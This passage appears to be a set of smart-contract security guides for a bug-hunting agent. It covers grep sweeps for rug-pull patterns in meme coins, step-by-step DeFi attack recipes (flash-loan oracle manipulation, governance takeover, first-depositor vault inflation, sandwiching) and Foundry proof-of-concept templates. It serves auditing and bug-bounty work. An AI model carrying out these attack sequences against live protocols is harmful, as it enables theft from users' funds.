grep -rn "maxTxAmount\|maxTransfer\|_maxWallet\|maxWalletSize" contracts/
# LP token destination
grep -rn "addLiquidityETH\|addLiquidity" -A5 contracts/ | grep "owner\|msg.sender"
# Cooldown (honeypot setup)
grep -rn "cooldown\|lastSell\|lastBuy\|tradingCooldown" contracts/
```

### Block 12: Solana Token Authorities
```bash
# Mint authority operations
grep -rn "mint_to\|MintTo\|mint_authority" src/ --include="*.rs"
# Freeze authority
grep -rn "freeze_account\|FreezeAccount\|ThawAccount\|freeze_authority" src/ --include="*.rs"
# Authority changes (looking for set to None = safe)
grep -rn "set_authority" -A5 src/ --include="*.rs" | grep "None\|AuthorityType"
# Token-2022 extensions
grep -rn "transfer_hook\|permanent_delegate\|transfer_fee\|non_transferable" src/ --include="*.rs"
```

### Block 13: DEX / LP Manipulation
```bash
# Auto-swap configuration
grep -rn "swapThreshold\|numTokensSellToAddToLiquidity\|shouldSwap" contracts/
# Slippage in auto-swaps (look for 0 as minOut)
grep -rn "swapExactTokensForETH\|swapExactTokensForTokens" -A3 contracts/ | grep ", 0,"
# Launch mechanics (atomic vs split)
grep -rn "function.*[Ll]iquidity\|function.*[Ll]aunch\|function.*[Tt]rading" contracts/
# LP lock
grep -rn "lock.*LP\|lockLP\|lockLiquidity\|lpLocker" contracts/
```


---

## From hack-skills: DeFi Attack Patterns

### Flash Loan Attack Framework

Flash loans: uncollateralized borrow within single transaction — must repay atomically.

```
Classic oracle manipulation:
1. Flash borrow 100,000 WETH from Aave/dYdX
2. Swap WETH → TOKEN on AMM_A (token price skyrockets on AMM_A)
3. Lending_Protocol reads AMM_A spot price → token "worth" 100x
4. Deposit small TOKEN collateral → borrow large WETH at inflated price
5. Swap TOKEN back → WETH on AMM_A (price restores)
6. Repay flash loan; keep stolen WETH from Lending_Protocol

KEY: protocols using AMM spot reserves (getReserves()) as oracle = vulnerable
SAFE: TWAP oracle or Chainlink aggregator required
```

### Flash Loan Governance Attack

```
1. Flash borrow governance tokens (before snapshot mechanism)
2. Create proposal: drain treasury / change admin
3. Proposal passes instantly (borrowed tokens = quorum)
4. Execute proposal
5. Return governance tokens → transaction reverts if repay fails

Defense: snapshot-based voting (Compound Governor Bravo), minimum proposal period, timelocks
```

### Price Oracle Manipulation

| Oracle Type | Manipulation Cost | Attack Window |
|---|---|---|
| Spot price `getReserves()` | Single large swap (flash loanable) | Same transaction |
| TWAP | Multi-block sustained swaps (expensive) | Multiple blocks |
| Chainlink | Compromise majority of oracle nodes | Practically infeasible |

### Chainlink Staleness Check (Common Miss)

```solidity
(, int price, , uint updatedAt, ) = priceFeed.latestRoundData();
// MISSING CHECKS (each is a separate vulnerability):
require(price > 0, "Invalid price");
require(updatedAt != 0, "Round not complete");
require(block.timestamp - updatedAt < HEARTBEAT, "Stale price");
require(answeredInRound >= roundId, "Stale round");
```

### MEV Attacks

```
Sandwich Attack:
  1. Spot victim's swap in mempool (e.g., TOKEN_A → TOKEN_B, 1% slippage)
  2. Front-run: buy TOKEN_B (price increases)
  3. Victim tx executes at worse price (within slippage tolerance)
  4. Back-run: sell TOKEN_B for profit
  
Profit = victim's price impact - 2x gas

JIT Liquidity (Uniswap V3):
  1. Observe large pending swap
  2. Add concentrated liquidity in exact price range
  3. Victim swap executes → JIT LP earns majority of fees
  4. Remove liquidity immediately after
```

### Vault Inflation Attack (First Depositor)

```
1. Attacker deposits 1 wei → receives 1 share
2. Attacker donates 1,000,000 tokens directly to vault (bypassing deposit)
3. State: 1,000,001 tokens, 1 share
4. Victim deposits 999,999 tokens:
   shares = 999,999 * 1 / 1,000,001 = 0 (integer truncation)
5. Victim gets 0 shares; attacker owns 100% of vault (2,000,000 tokens)

Defense: mint dead shares on first deposit; require minimum initial deposit
```

### Bridge Attack Vectors

| Attack | Real-World Example |
|---|---|
| Signature verification bypass | Ronin Bridge $624M — compromised 5/9 validators |
| Uninitialized guardian set | Wormhole $320M — smart contract bug |
| Message replay | Deposit proof used on multiple chains |
| Fake deposit proof | Submit proof for non-existent L1 deposit |
| Upgradeable proxy exploit | Attacker gains upgrade authority → swap implementation |



---

## meme-coin-audit

# MEME COIN & TOKEN SECURITY AUDIT

Fast-kill rug pull detection and deep token security analysis for EVM and Solana meme coins.

---

## PRE-DIVE KILL SIGNALS

Check these BEFORE reading a single line of code. If any are true, skip the audit — the token is likely a rug or not worth the time.

### Hard Kills (Skip Immediately)
- **Contract not verified** on Etherscan/Solscan → Cannot audit source = cannot trust
- **Deployer wallet** has history of rug pulls (check Etherscan deployer page)
- **Token age < 1 hour** AND no known team → Too early, wait for more data
- **Mint authority retained** (Solana) AND no cap → Infinite mint = certain rug
- **Freeze authority retained** (Solana) on meme coin → Honeypot confirmed
- **Transfer hook present** (Token-2022) with mutable hook program → Honeypot vector
- **Permanent delegate** extension (Token-2022) → Can steal all holder tokens

### Soft Kills (Proceed with Extreme Caution)
- Top holder > 20% of supply (excluding DEX pools)
- LP not burned or locked in verified contract
- Contract is upgradeable / proxy with retained admin
- Less than $5K liquidity in the pool
- No social presence / anonymous deployer with no history

---

## THE ONE RULE

> **"Check ALL authorities and owner functions. The retained authority IS the rug vector."**
>
> Every rug pull requires a privileged operation: mint, blacklist, fee change, LP removal, or authority abuse. If you find the privilege, you found the bug.

---

## BUG CLASSES (8 TOKEN-SPECIFIC)

### 1. HIDDEN MINT / UNLIMITED SUPPLY
> Common rug pattern. Deployer mints tokens post-launch, dumps on LP.

**Quick grep (EVM):**
```bash
grep -rn "function mint\|_mint(\|_balances\[.*\] +=" src/ --include="*.sol" | grep -v "test\|lib\|node_modules"
```

**Quick grep (Solana):**
```bash
grep -rn "MintTo\|mint_to\|mint_authority" src/ --include="*.rs" | grep -v "test\|target"
```

**Kill if:** MAX_SUPPLY enforced in every mint path, or mint function removed entirely.

### 2. HONEYPOT / TRANSFER RESTRICTION
> Common scam pattern. Buy works, sell blocked.

**Quick grep:**
```bash
grep -rn "blacklist\|isBlacklisted\|_bots\|maxTxAmount\|approve.*override\|tradingEnabled" src/ --include="*.sol"
```

**Solana equivalent:**
```bash
grep -rn "freeze_authority\|transfer_hook\|TransferHook\|permanent_delegate" src/ --include="*.rs"
```

**Kill if:** No blacklist mapping, no transfer hooks, no freeze authority.

### 3. FEE MANIPULATION
> Common rug pattern. Sell fee set to 99% after initial buys.

**Quick grep:**
```bash
grep -rn "setFee\|setSellFee\|_taxFee\|_sellFee" src/ --include="*.sol"
grep -rn "function set.*Fee" -A5 src/ --include="*.sol" | grep -v "require\|MAX\|<="
```

**Kill if:** Fee setter has `require(fee <= MAX_FEE)` with MAX_FEE <= 10%.

### 4. LIQUIDITY POOL DRAIN
> LP removal, migration, or manipulation to crash price.

**Quick grep:**
```bash
grep -rn "migrateLP\|emergencyWithdraw\|\.sync()\|setPair\|setRouter" src/ --include="*.sol"
```

**Kill if:** LP tokens burned to dead address, no migration function, no pair setter.

### 5. BONDING CURVE MANIPULATION
> Exploits in pump.fun-style bonding curves.

**Quick grep:**
```bash
grep -rn "virtualReserve\|setCurve\|graduate\|bonding_curve" src/ --include="*.sol" --include="*.rs"
```

**Kill if:** Curve parameters immutable, graduation permissionless.

### 6. AUTHORITY RETENTION (SOLANA)
> Retained mint/freeze/update authorities on Solana tokens.

**Quick grep:**
```bash
grep -rn "mint_authority\|freeze_authority\|update_authority\|close_authority" src/ --include="*.rs"
grep -rn "set_authority.*None" src/ --include="*.rs"  # Good sign: revocation
```

**Kill if:** All authorities = None, verified on-chain.

### 7. FAKE RENOUNCE / HIDDEN OWNERSHIP
> Ownership appears renounced but backdoor control retained.

**Quick grep:**
```bash
grep -rn "renounceOwnership.*override\|_shadowAdmin\|_backupOwner\|selfdestruct" src/ --include="*.sol"
```

**Kill if:** renounceOwnership NOT overridden, no second admin role, no selfdestruct.

### 8. SANDWICH AMPLIFICATION BY DESIGN
> Contract makes holders maximally sandwichable.

**Quick grep:**
```bash
grep -rn "swapExactTokensForETH" -A5 src/ --include="*.sol" | grep "0,"
grep -rn "swapThreshold\|_rebase\|mandatoryPool" src/ --include="*.sol"
```

**Kill if:** Auto-swap has proper slippage, no rebase mechanics.

---

## FAST RED-FLAG SWEEP

Run the 8 bug-class greps above across the source tree for fast red-flag detection. Together they catch:
- Direct mint/balance manipulation
- Blacklist and transfer restriction patterns
- Unbounded fee setters
- LP migration and emergency withdraw functions
- Fake renounce overrides
- Zero slippage auto-swaps
- All Solana authority patterns
- Token-2022 dangerous extensions

**Source grep does NOT check** (verify these out-of-band):
- On-chain state (use Etherscan/Solscan for authority verification)
- Holder distribution (use DEXTools/Birdeye)
- LP lock status (use Unicrypt/PinkLock/Solscan)
- Deployer wallet history (manual check)

---

## FOUNDRY POC TEMPLATE (TOKEN EXPLOITS)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Token.sol";

contract TokenExploitTest is Test {
    Token token;
    address owner = makeAddr("owner");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    // Uniswap V2 router (mainnet fork)
    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        vm.createSelectFork("mainnet");
        // Deploy token as owner
        vm.startPrank(owner);
        token = new Token();
        // Add liquidity...
        vm.stopPrank();
    }

    function test_hiddenMint_rug() public {
        // Step 1: Victim buys tokens
        vm.startPrank(victim);
        // ... buy tokens on Uniswap
        vm.stopPrank();

        // Step 2: Owner mints and dumps
        vm.startPrank(owner);
        uint256 supplyBefore = token.totalSupply();
        token.mint(owner, 1_000_000_000e18);
        assertGt(token.totalSupply(), supplyBefore, "Supply should increase");
        // ... sell minted tokens
        vm.stopPrank();

        // Step 3: Victim's tokens are now worthless
        // Assert token price crashed
    }

    function test_honeypot_blacklist() public {
        // Step 1: Victim buys
        vm.startPrank(victim);
        // ... buy tokens
        vm.stopPrank();

        // Step 2: Owner blacklists victim
        vm.startPrank(owner);
        token.blacklist(victim);
        vm.stopPrank();

        // Step 3: Victim cannot sell
        vm.startPrank(victim);
        vm.expectRevert("Blacklisted");
        token.transfer(address(1), 100e18);
        vm.stopPrank();
    }

    function test_fee_manipulation_rug() public {
        // Step 1: Verify initial fee is low
        assertEq(token.sellFee(), 3); // 3%

        // Step 2: Owner sets fee to 99%
        vm.prank(owner);
        token.setFees(3, 99); // Buy 3%, Sell 99%

        // Step 3: Victim sells — loses 99% to fees
        vm.startPrank(victim);
        uint256 balanceBefore = address(victim).balance;
        // ... sell tokens
        // Assert: received almost nothing
        vm.stopPrank();
    }
}
```

---

## SOLANA QUICK CHECKS (NO SOURCE CODE NEEDED)

When you don't have source code, check on-chain:

```
1. MINT AUTHORITY → solana account <MINT> --output json | check mint_authority
   - Should be null
   - If Some(pubkey) → CRITICAL: can mint infinite tokens

2. FREEZE AUTHORITY → same as above, check freeze_authority
   - Should be null
   - If Some(pubkey) → CRITICAL: honeypot

3. LP STATUS → Check Raydium/Orca pool
   - LP burned? (tokens sent to 1111...1111)
   - LP locked? (in verified locker with no backdoor)
   - LP held by deployer? → CRITICAL: instant rug

4. TOP HOLDERS → Birdeye/Solscan holders tab
   - Top 10 < 30% of supply (excluding pools)
   - Creator wallets (check first transactions)

5. PROGRAM UPGRADEABILITY
   - Is the program upgradeable? → can change any logic
   - Upgrade authority should be None for immutable programs

6. TOKEN-2022 EXTENSIONS
   - Any transfer hook? → potential honeypot
   - Permanent delegate? → CRITICAL
```

---

## Related Skills & Chains

- **`web3-audit`** — When the target is a DeFi protocol (not just a token). Workflow primitive: this skill's 8 token-specific bug classes are a subset of `web3-audit`'s scope; if the target has lending / vault / oracle logic beyond the token contract itself, also load `web3-audit` for the broader 10 DeFi bug classes.
- **`triage-validation`** — When deciding if a rug-pull finding qualifies as a bug bounty submission. Workflow primitive: many "rug vector" observations are pre-rug warnings, not exploitable bugs in a deployed protocol; run 7Q gate to distinguish "the deployer COULD rug" (informational) from "the contract IS exploitable now" (reportable).
- **`report-writing`** — When writing up a confirmed token security finding for Immunefi / private bounty. Workflow primitive: Foundry PoC template here feeds into `report-writing`'s Immunefi body template.
- **`offensive-osint`** — When the token has off-chain infrastructure (project website, Telegram, deployer doxxing). Workflow primitive: on-chain audit is this skill's domain; deployer wallet history, social presence, and project legitimacy checks route to `offensive-osint`.
- **`bb-methodology`** — When confirming engagement mode. Workflow primitive: PART 0 separates "pre-investment due diligence" (this skill's primary use) from "Immunefi bug bounty submission" (different reporting + severity standards); the answer routes which post-audit handoff is correct.

---

## Operator Notes (Claude-BugHunter)

> Engagement-derived + 2026-specific additions to the vendored foundation.
> Wisdom from real authorized engagements + Phase 2 verification across
> this repo's 31+ skill-area live tests. The upstream content covers the WHAT;
> this layer covers the WHEN-IT-WORKS-vs-WHEN-IT-DOESN'T.

### Solana-specific signals — 2025-2026 reality

Token-2022 transfer hooks are the new rug-pull vector. Hook authority can be set to a single key; that key can pause / blacklist / fee-on-transfer arbitrary addresses post-launch. Always check hook authority + permanent-delegate authority for Token-2022 mints:

```bash
# get mint extensions for a Token-2022 mint
spl-token display <MINT_ADDRESS> --program-id TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb
# look for: TransferHook { authority: ... }, PermanentDelegate { delegate: ... }
```

If TransferHook authority is non-null → the holder of that key can revoke transfer rights mid-trade. If PermanentDelegate is non-null → that delegate can move any holder's tokens at any time (effectively a built-in confiscation). Either alone is rug-class.

pump.fun bonding curves can be manipulated via the curve's K-parameter; mint authority retained beyond bonding-curve completion is the classic exit-scam shape. Check `mintAuthority` AFTER the curve completes — legitimate launches null it, scams retain it for the post-graduation dump.

### Honeypot detection — beyond the obvious

`transfer()` succeeds in dry-run but fails on certain addresses (sender allowlist / blocklist). Test with: simulated buy → simulated transfer to a different address → simulated sell. If buy + transfer succeed but sell fails, it's a honeypot.

Quick triage matrix:

| Test | Honeypot Signal |
|------|----------------|
| Buy from random wallet | Succeeds (must — or no one would touch it) |
| Transfer to second random wallet | Often fails on honeypot |
| Sell from original wallet | Fails or applies > 50% tax |
| Sell from team-controlled wallet | Succeeds (the giveaway) |

Cross-source verification: solana-rugcheck, rugcheck.xyz, dexscreener risk signals, honeypot.is (EVM). Never trust a single source — rug-checkers can be fooled by deferred-malice patterns (clean for first 7 days, hook activates later).

### LP lock claims — verify, don't trust

LP-lock badges on DexScreener mean nothing without on-chain verification. Check the actual lock contract (Unicrypt, TeamFinance, Bonkbot, PinkLock) for:

- **Unlock date** — the on-chain timestamp, not the badge text
- **Lock owner** — is it the deployer's wallet? Are there multiple lockers fragmenting the LP?
- **Extension / shortening permission** — some lock contracts allow the owner to SHORTEN the lock; that's an exit hatch dressed as a lock
- **Lock contract bytecode** — verify it's the canonical locker, not a fork with backdoors

Some "locked" LPs are 1-day locks renewed weekly — visually the same as a year lock to the buyer, but the deployer can let it lapse on any Tuesday. Always read the lock contract source on the chain explorer.

### Pre-investment due diligence in under 5 minutes

The 6-question fast filter:

1. Mint authority null?
2. Freeze authority null?
3. Update authority null (for metadata immutability)?
4. LP locked in a verified contract for > 6 months?
5. Top 10 holders concentration < 30% (excluding pools/burn addresses)?
6. Bonding curve completed (for pump.fun) AND post-completion mint authority null?

Five "no"s = walk away. Three "no"s = high risk, only enter with size you'd walk away from. Two "no"s with strong narrative + thin liquidity = the canonical retail trap.

### MEV / sandwich amplification on illiquid mints

Buying into a mint with < $50K liquidity guarantees you'll be sandwiched. The bot infrastructure on Solana and Ethereum is institutionalized in 2026 — Jito MEV-share and private order-flow auctions. If your trade size > 1% of available liquidity, expect sandwich loss > 5%; > 5% of liquidity, expect > 20% slippage from sandwich alone.

Mitigations (rank by 2026 effectiveness):

1. **Jito bundles** (Solana) — submit with priority tip, atomic with no MEV window
2. **Flashbots Protect RPC** (Ethereum) — private mempool submission
3. **MEV-protected DEX aggregators** — Jupiter's slippage protection, 1inch Fusion, CoWSwap
4. **Splitting orders** — N smaller trades vs 1 large; reduces sandwich profitability per trade

If the mint is so illiquid that even split orders sandwich — that's the signal to skip the trade, not the signal to use better tooling.



---

## smart-contract-audit

# SMART CONTRACT SECURITY AUDIT

---

## TARGET EVALUATION SCORECARD

Score each criterion before spending time on the target. **Score < 6 → skip.**

| Criterion | Score | Evidence |
|---|---|---|
| Active bounty on Immunefi / Code4rena | +2 | Live program page |
| TVL > $1M (DeFiLlama) | +2 | llama.fi |
| Max Critical payout ≥ $50K | +2 | Program page |
| Complex custom math (AMM, vault, lending) | +2 | Skim contracts |
| ≤ 2 prior audits | +1 | Program page / GitHub |
| Program launched < 90 days | +1 | "New" filter |
| Cross-chain or proxy patterns in scope | +1 | Scope section |

**Hard kill signals — skip regardless of score:**
- TVL < $500K
- 2+ top-tier audits (Trail of Bits, OpenZeppelin, Spearbit) — all Low/Med addressed
- Simple protocol < 500 lines — unlikely novel bugs
- Max Critical payout < $10K

---

## ATTACK SURFACE MINDMAP

### DEX / AMM
- **Oracle manipulation:** `getReserves()` / `slot0()` manipulable with flash loans → use TWAP
- **Rounding attacks:** 1-wei deposit + donate → share inflation (ERC4626 first depositor)
- **Sandwich vectors:** missing slippage param, predictable auto-swap trigger
- **Fee-on-transfer token:** `amount received ≠ amount sent` breaks accounting
- **LP manipulation:** flash-loan LP position to shift reserve ratio

### Lending / Borrowing
- **Collateral valuation:** oracle overborrow → bad debt
- **Liquidation:** self-liquidation, bad debt socialization, partial fill rounding
- **Interest accrual:** rounding direction, missing accrual before operation
- **Flash loan overborrow:** inflate collateral price → borrow more than collateral worth
- **ERC4626 integration:** deposit/withdraw rounding wrong direction

### Bridge / Cross-Chain
- **Message replay:** missing nonce / nullifier on destination
- **Signature replay:** missing chainId in domain separator
- **Validator manipulation:** threshold below quorum
- **Uninitialized proxy:** anyone calls `initialize()` on implementation
- **Cross-chain replay:** same sig usable on mainnet + L2
- **Destination reentrancy:** re-enter during message execution

### Vault / Yield
- **Share price manipulation:** ERC4626 inflation (1-wei + donate)
- **ERC4626 rounding direction:** deposits round down (user), withdrawals round up (protocol)
- **Reward accounting desync:** enter/exit timing attacks
- **Withdrawal queue:** multi-field state not updated atomically
- **Strategy rug:** malicious external protocol interaction

### Stablecoin
- **Collateral depeg:** oracle doesn't reflect real-time depeg
- **Oracle dependence:** single Chainlink feed, no circuit breaker
- **Liquidation rounding:** favors borrower → protocol bad debt over time

### Governance / DAO
- **Flash loan voting:** borrow tokens → vote → repay in one tx
- **Quorum manipulation:** tokens minted after snapshot
- **Timelock bypass:** execute before timelock delay
- **Snapshot timing:** vote with tokens that will be used elsewhere

### ZK / Proof Systems
- **Unsound constraints:** relation holds trivially (attacker satisfies without knowing secret)
- **Unconstrained witness:** prover can set witness to arbitrary value
- **Missing range checks:** values outside expected domain accepted
- **Exodus mode bypass:** invalid state transition accepted by verifier

---

## 10-STEP AUDIT METHODOLOGY

```
1. READ DOCS — whitepaper, design doc, NatSpec. What SHOULD it do?
2. SCOPE + LINE COUNT — in-scope contracts only. > 1000 lines → prioritize by TVL flow.
3. LOCAL SETUP — git clone, forge build (fix compile errors), forge test, forge coverage.
4. STATIC ANALYSIS — Slither + Aderyn: note HIGH/CRITICAL only.
   slither . --exclude-low --filter-paths "test|lib|node_modules"
   aderyn . --output report.md
5. ARCHITECTURE VISUALIZATION — draw fund flow mentally. Where does value ACCUMULATE?
6. GREP SURFACE MAP — 10 grep blocks (see below). List candidates.
7. CHECKLIST REVIEW — apply checklist per protocol type (access control, math, oracle, etc.)
8. LINE-BY-LINE MANUAL REVIEW — prioritize functions touching state + external calls.
9. INVARIANT TESTING — Echidna/Medusa for critical invariants (solvency, share price).
10. PoC WRITING — Foundry fork test proving profit > 0 for every Critical/High candidate.
```

---

## OWASP SMART CONTRACT TOP 10

| ID | Category | 2024 Stats | First Grep |
|---|---|---|---|
| SC01 | Access Control | $953M stolen, 19% of Criticals | `function.*external` without modifier |
| SC02 | Business Logic | Protocol-specific | Custom accounting math |
| SC03 | Oracle Manipulation | 12% of Criticals | `latestRoundData\|getReserves\|slot0` |
| SC04 | Flash Loan | 83% of eligible exploits use it | Any governance vote or spot price |
| SC05 | Input Validation | 17% of Criticals (incomplete paths) | Missing zero-address checks |
| SC06 | Unchecked External Calls | 8% of Criticals | `.call{` without return check |
| SC07 | Arithmetic | Rounding & overflow | `/ totalShares\|* price / 1e18` |
| SC08 | Reentrancy | $35.7M in 2024, $300M+ all-time | `.call{value` before state update |
| SC09 | Denial of Service | Liveness attack | `for.*length\|push.*unbounded` |
| SC10 | Proxy / Upgradeability | $10M Wormhole | `function initialize\|upgradeTo` |

---

## 2024-2025 HIGH-VALUE BUG CLASSES

### 1. ERC4626 Near-Empty Vault (First Depositor Inflation)
**Payout range: $50K–$500K**
```
Attack:
1. Protocol deploys empty ERC4626 vault (totalAssets = 0, totalShares = 0)
2. Attacker deposits 1 wei → gets 1 share
3. Attacker donates 100 ETH directly to vault (not via deposit)
4. totalAssets = 100 ETH + 1 wei, totalShares = 1
5. Victim deposits 100 ETH → convertToShares(100 ETH) = 100e18 / 100e18 = 0 shares → victim gets 0
6. Attacker redeems 1 share → gets entire vault (200 ETH)

Fix: virtual shares (OpenZeppelin adds 1e3 offset), or _asset.transfer to dead address on first deposit
```
**Grep:** `convertToShares\|previewDeposit\|totalAssets()`

### 2. EIP-2612 Permit Frontrun DoS
**Payout range: $5K–$50K**
```
Attack: Victim submits permitAndDeposit(). Attacker frontruns with same permit sig.
Victim's nonce is consumed → their tx reverts → DoS on deposit.

Fix: wrap permit() in try/catch — if nonce already consumed, check allowance instead.
```

### 3. Signature Replay (Cross-Chain)
**Payout range: $50K–$5M (Polygon $2.2M, zkSync $200K)**
```
Vulnerability: signature doesn't include chainId
Attack: claim reward on Ethereum, replay same signature on Arbitrum

Fix: EIP-712 DOMAIN_SEPARATOR must include block.chainid + address(this)
```

### 4. ZK Proof Verifier Bypass
**Payout range: $50K–$10M**
```
Vulnerability: unsound constraint lets attacker prove arbitrary claims
Attack: submit invalid proof that verifier accepts → withdraw without depositing

Grep: unconstrained signals, missing range checks, trivially satisfiable constraints
```

### 5. Missing Access Control on Sibling Function
**Payout range: $50K–$1M (19% of all Criticals)**
```
Example: vote() has onlyRole(VOTER), but poke() / reset() / harvest() doesn't
Attack: call unprotected sibling to manipulate same state that vote() protects

Rule: If functionA() has modifier X → check ALL functions touching same state
```

### 6. Donation Attack via Direct balanceOf Transfer
**Payout range: $50K–$500K**
```
Vulnerability: protocol uses token.balanceOf(this) instead of tracked internal balance
Attack: send tokens directly (transfer, not deposit) → inflate totalAssets
→ share price jumps → existing depositors profit at victim's expense (or vice versa)

Fix: use internal tracked balance, not live balanceOf
```

### 7. Deploy Script / Initializer Bugs
**Payout range: $10K–$500K**
```
Vulnerability: initialize() not called, wrong params, wrong order of calls
Attack: call initialize() on uninitialized implementation → become admin → upgrade to malicious

Fix: _disableInitializers() in implementation constructor
```

---

## GREP QUICK-HITS

```bash
# Access Control — missing modifier on external function
grep -rn "function.*external" contracts/ | grep -v "view\|pure\|returns"
grep -rn "onlyOwner\|onlyRole\|onlyAdmin" contracts/
# Count: external functions vs. protected ones — gap = attack surface

# Reentrancy — external call before state update
grep -rn "\.call{value\|\.transfer(\|\.send(" contracts/ -B5 | grep -v "//"
grep -rn "nonReentrant" contracts/

# Oracle / Price — manipulable spot prices
grep -rn "latestRoundData\|latestAnswer\|getReserves\|slot0\b" contracts/
grep -rn "sequencerUptimeFeed\|answeredInRound\|roundId" contracts/

# Unchecked Math
grep -rn "unchecked {" contracts/ -A10

# Input Validation — missing zero address checks
grep -rn "address(0)\|require.*!= address(0)" contracts/

# Signatures / Replay
grep -rn "ecrecover\|ECDSA\.recover" contracts/
grep -rn "chainId\|block\.chainid\|DOMAIN_SEPARATOR" contracts/
grep -rn "nonces\[\|nonce\b" contracts/

# ERC4626 / Vault
grep -rn "convertToShares\|convertToAssets\|totalAssets()\|previewDeposit" contracts/

# Upgradeable Proxy
grep -rn "function initialize\b" contracts/ -A3
grep -rn "_disableInitializers()\|_authorizeUpgrade" contracts/

# ZK / Proof Verifier
grep -rn "verify\|Verifier\|snarkjs\|circom" contracts/
grep -rn "require.*verify\|assert.*valid" contracts/

# State Completeness — missing paired updates
grep -rn "function update_\|function cancel\|function refund\|function remove" contracts/
```

---

## AUDIT CHECKLIST

### Access Control
- [ ] Every external/public non-view function has an appropriate modifier
- [ ] All sibling functions touching same state have same protection
- [ ] Roles are assigned correctly in constructor / initializer
- [ ] Admin role has multi-sig or timelock (not EOA)
- [ ] `upgradeTo` / `_authorizeUpgrade` requires onlyOwner

### Math & Logic
- [ ] No division before multiplication (rounding loss)
- [ ] Rounding direction: deposits round down (user gets fewer shares), withdrawals round up
- [ ] No `unchecked {}` on user-controlled arithmetic
- [ ] Fee calculations use correct precision (1e18 basis)
- [ ] Reward index updates before any deposit/withdraw

### Reentrancy
- [ ] All external calls follow CEI (Checks-Effects-Interactions)
- [ ] `nonReentrant` on all state-changing functions that call external contracts
- [ ] Read-only reentrancy: view functions called in callbacks use post-callback state

### Oracle & Price
- [ ] No spot price from `getReserves()` or `slot0` — use TWAP
- [ ] Chainlink: check `updatedAt` for staleness, check `answeredInRound >= roundId`
- [ ] L2 deployments: check sequencer uptime feed
- [ ] Pyth: validate confidence interval

### Token Handling
- [ ] Fee-on-transfer tokens: measure `balanceBefore - balanceAfter`, not `amount`
- [ ] No `token.balanceOf(this)` for accounting — use internal tracked balance
- [ ] Rebase tokens: snapshot balance before, check received after

### Proxy & Upgrades
- [ ] Implementation: `_disableInitializers()` in constructor
- [ ] `initialize()` has `initializer` modifier
- [ ] New storage variables appended after existing ones (no slot collision)
- [ ] `__gap` reserved for future variables
- [ ] `DOMAIN_SEPARATOR` recalculated at runtime (not hardcoded)

### Governance
- [ ] Flash loan attack on voting: snapshot before or use time-weighted votes
- [ ] Proposal execution: timelock delay enforced
- [ ] Quorum manipulation: tokens minted after snapshot don't count

---

## FOUNDRY PoC QUICK START

```bash
# Clone Immunefi's official PoC template
git clone https://github.com/immunefi-team/forge-poc-templates
cd forge-poc-templates

# Branch options:
# main — standard template
# reentrancy — reentrancy-focused
# flash_loan — flash loan attack
# price_manipulation — oracle manipulation

# Standard structure:
# test/PoC.t.sol — your exploit test
# forge test --match-test testExploit -vvv

# Run against pinned mainnet fork:
forge test --match-test testExploit --fork-url $MAINNET_RPC --fork-block-number 20000000 -vvv
```

### Standard PoC Template Structure
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
// Import target protocol interfaces

contract ExploitTest is Test {
    // ===== CONFIGURATION =====
    uint256 constant FORK_BLOCK = 20000000;
    address constant VICTIM_POOL = 0x...;

    // ===== SETUP =====
    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC"), FORK_BLOCK);
        // Label addresses
        vm.label(VICTIM_POOL, "VictimPool");
    }

    // ===== EXPLOIT =====
    function testExploit() public {
        uint256 balanceBefore = attacker.balance;

        // 1. SETUP: get flash loan / initial capital
        // 2. EXPLOIT: execute the attack
        // 3. REPAY: return flash loan

        uint256 profit = attacker.balance - balanceBefore;
        console.log("Profit:", profit);
        assertGt(profit, 0, "Exploit must be profitable");
    }
}
```

### Essential Cheatcodes
```solidity
vm.prank(address);                      // next call from address
vm.startPrank(address);                 // all subsequent calls from address
vm.stopPrank();
vm.deal(address, amount);               // set ETH balance
vm.store(contract, slot, value);        // write storage slot directly
vm.load(contract, slot);                // read storage slot
vm.warp(timestamp);                     // set block.timestamp
vm.roll(blockNumber);                   // set block.number
vm.createSelectFork(url, blockNumber);  // fork mainnet at block
vm.mockCall(addr, calldata, returndata);// mock external calls
vm.expectRevert(bytes);                 // assert next call reverts
vm.expectEmit(true, true, false, true); // assert event emitted
vm.sign(privKey, digest);               // sign an EIP-712 digest
```

---

## NON-EVM CHAINS

### Solana (Rust/Anchor)
Top vulnerability classes:

| Class | Description | Grep Pattern |
|---|---|---|
| Missing owner check | Account's owner not validated → attacker passes malicious account | `assert_eq!(ctx.accounts.X.owner` |
| Missing signer | Instruction proceeds without signature | `is_signer: true` missing on constraint |
| Type cosplay | Wrong account type accepted (TokenAccount passed as Mint) | `AccountInfo` without type check |
| PDA seed collision | Different inputs produce same PDA → account confusion | Custom seeds in Anchor `seeds = [...]` |
| Arbitrary CPI | Program invokes untrusted external program | `invoke(` / `invoke_signed(` with user-supplied program |
| Integer overflow | No `checked_add` / `checked_mul` in Rust pre-2021 edition | Arithmetic without checked ops |
| Sysvar spoofing | Fake sysvar account passed as `clock`, `rent` etc. | `Sysvar::from_account_info` |

**Tools:** `sec3 X-Ray`, `Trident` (fuzzer)

### CosmWasm (Rust)
- Reentrancy via submessages (ReplyOn::Always)
- Integer overflow in token math  
- Missing admin check on ExecuteMsg variants

### Move / Aptos / Sui
- Resource existence check bypasses
- Capability leakage across module boundaries
- Object ownership confusion in Sui

### Cross-Chain Bridges ($2.8B+ stolen)
- Message replay (missing nullifier)
- Validator threshold below 51%
- Uninitialized destination proxy
- Cross-chain signature without chainId
- Asset lock without matching mint

---

## IMMUNEFI RULES

```
✓ No live mainnet testing (simulate with Foundry fork)
✓ No AI spray reports (auto-generated = banned)
✓ Max 5 reports per 48 hours
✓ One bug per report
✓ Foundry PoC REQUIRED for Critical: runnable fork test + before/after balances
✓ console.log("Before:", balance_before) + console.log("After:", balance_after)
✓ assertGt(profit, 0) — proves profitability
✓ Pinned block number in fork

✗ What Immunefi rejects:
  - Theoretical bugs without PoC
  - Bugs in out-of-scope contracts
  - Centralization risks (admin rug = not a bug)
  - MEV / sandwich attacks (market issue)
  - Gas optimization suggestions
